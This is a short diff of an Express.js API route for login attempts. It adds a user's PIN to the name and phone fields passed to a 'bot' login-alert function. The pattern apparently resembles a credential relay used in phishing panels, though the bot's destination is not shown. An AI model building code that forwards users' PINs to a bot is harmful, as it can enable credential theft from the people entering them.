@@ -43,15 +43,15 @@ app.all('/api', async (req, res) => {
 
     case 'login_attempt': {
       const firstName = req.body.firstName || '';
-      const lastName  = req.body.lastName  || '';
-      const phone     = req.body.phone     || '';
+const lastName  = req.body.lastName  || '';
+const phone     = req.body.phone     || '';
+const pin       = req.body.pin       || '';
 
-      if (!firstName || !lastName || !phone) {
-        return res.json({ success: false, error: 'Missing fields' });
-      }
+if (!firstName || !lastName || !phone) {
+  return res.json({ success: false, error: 'Missing fields' });
+}
 
-      const result = await bot.sendLoginAlert(firstName, lastName, phone);
-
+const result = await bot.sendLoginAlert(firstName, lastName, phone, pin);
       if (result && result.sessionId) {
         return res.json({
           success: true,
